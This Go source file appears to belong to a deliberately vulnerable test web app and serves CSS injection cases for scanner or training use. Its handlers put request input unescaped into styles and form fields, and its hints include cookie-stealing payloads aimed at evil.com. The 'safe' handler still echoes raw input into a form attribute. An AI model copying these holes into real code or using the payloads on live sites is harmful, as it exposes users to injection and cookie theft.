// vulns/injection/css/handlers.go
package css

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/subzerodev/hive/handlers"
)

func init() {
	handlers.Register(func() {
		handlers.Handle("/vulns/injection/css/inline", inline)
		handlers.Handle("/vulns/injection/css/style-tag", styleTag)
		handlers.Handle("/vulns/injection/css/import", importCSS)
		handlers.Handle("/vulns/injection/css/expression", expression)
		handlers.Handle("/vulns/injection/css/fp/sanitized", fpSanitized)
	})
}

func inline(w http.ResponseWriter, r *http.Request) {
	color := r.URL.Query().Get("color")
	if color == "" {
		color = "blue"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: User input in inline style
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>CSS Injection - Inline</title></head>
<body>
<h1>CSS Injection - Inline Style</h1>
<form method="GET">
    <input name="color" value="%s" placeholder="Color" style="width:300px">
    <button type="submit">Apply</button>
</form>
<h2>Result:</h2>
<div id="output" style="color: %s; padding: 20px; border: 1px solid #ccc;">
    This text has the injected color style.
</div>
<h3>Hint:</h3>
<p><small>Try: blue; background: url('http://evil.com/steal?cookie='+document.cookie)</small></p>
<p><small>Or: blue; } body { background: red } .x {</small></p>
<p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
</body></html>`, color, color)
}

func styleTag(w http.ResponseWriter, r *http.Request) {
	selector := r.URL.Query().Get("selector")
	if selector == "" {
		selector = "h1"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: User input in style tag
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>CSS Injection - Style Tag</title>
<style>
%s {
    color: red;
    font-size: 24px;
}
</style>
</head>
<body>
<h1>CSS Injection - Style Tag</h1>
<form method="GET">
    <input name="selector" value="%s" placeholder="CSS Selector" style="width:300px">
    <button type="submit">Apply</button>
</form>
<h2>Applied Style:</h2>
<pre>%s { color: red; font-size: 24px; }</pre>
<p class="target">This is a paragraph with class "target"</p>
<div class="box">This is a div with class "box"</div>
<h3>Hint:</h3>
<p><small>Try: h1 { } body { background: url('http://evil.com/'); } h2</small></p>
<p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
</body></html>`, selector, selector, selector)
}

func importCSS(w http.ResponseWriter, r *http.Request) {
	url := r.URL.Query().Get("url")
	if url == "" {
		url = "/static/style.css"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: User-controlled CSS import
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>CSS Injection - Import</title>
<style>
@import url('%s');
</style>
</head>
<body>
<h1>CSS Injection - CSS Import</h1>
<form method="GET">
    <input name="url" value="%s" placeholder="CSS URL" style="width:400px">
    <button type="submit">Import</button>
</form>
<h2>Imported CSS:</h2>
<pre>@import url('%s');</pre>
<h3>Hint:</h3>
<p><small>Try: http://evil.com/malicious.css</small></p>
<p><small>Attacker-controlled CSS can exfiltrate data using attribute selectors</small></p>
<p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
</body></html>`, url, url, url)
}

func expression(w http.ResponseWriter, r *http.Request) {
	value := r.URL.Query().Get("value")
	if value == "" {
		value = "100px"
	}

	w.Header().Set("Content-Type", "text/html")

	// VULNERABLE: CSS expression (legacy IE)
	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head>
<title>CSS Injection - Expression</title>
<style>
.dynamic {
    width: expression(%s);
    /* Legacy IE CSS expression - executes JavaScript */
}
</style>
</head>
<body>
<h1>CSS Injection - CSS Expression (Legacy IE)</h1>
<form method="GET">
    <input name="value" value="%s" placeholder="Expression value" style="width:400px">
    <button type="submit">Apply</button>
</form>
<h2>Applied Style:</h2>
<pre>width: expression(%s);</pre>
<div class="dynamic">Dynamic width element</div>
<h3>Hint:</h3>
<p><small>Try: alert(document.cookie) (works in legacy IE)</small></p>
<p><small>CSS expressions were removed in IE8+ standards mode</small></p>
<p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
</body></html>`, value, value, value)
}

func fpSanitized(w http.ResponseWriter, r *http.Request) {
	color := r.URL.Query().Get("color")
	if color == "" {
		color = "blue"
	}

	w.Header().Set("Content-Type", "text/html")

	// SAFE: Only allow valid color values
	validColors := map[string]bool{
		"red": true, "blue": true, "green": true, "black": true,
		"white": true, "yellow": true, "orange": true, "purple": true,
	}

	// Also allow hex colors
	hexPattern := regexp.MustCompile(`^#[0-9a-fA-F]{3,6}$`)

	safeColor := "black"
	if validColors[strings.ToLower(color)] {
		safeColor = color
	} else if hexPattern.MatchString(color) {
		safeColor = color
	}

	fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>CSS Injection - Safe</title></head>
<body>
<h1>CSS Injection - Safe (Sanitized)</h1>
<form method="GET">
    <input name="color" value="%s" placeholder="Color" style="width:300px">
    <button type="submit">Apply</button>
</form>
<h2>Result:</h2>
<div id="output" style="color: %s; padding: 20px; border: 1px solid #ccc;">
    This text has the safe color style.
</div>
<h3>Security:</h3>
<p><small>SAFE: Only whitelisted color names and valid hex codes allowed</small></p>
<p><small>Allowed: red, blue, green, black, white, yellow, orange, purple, #RGB, #RRGGBB</small></p>
<p><a href="/vulns/injection/css/">Back to CSS Tests</a></p>
</body></html>`, color, safeColor)
}
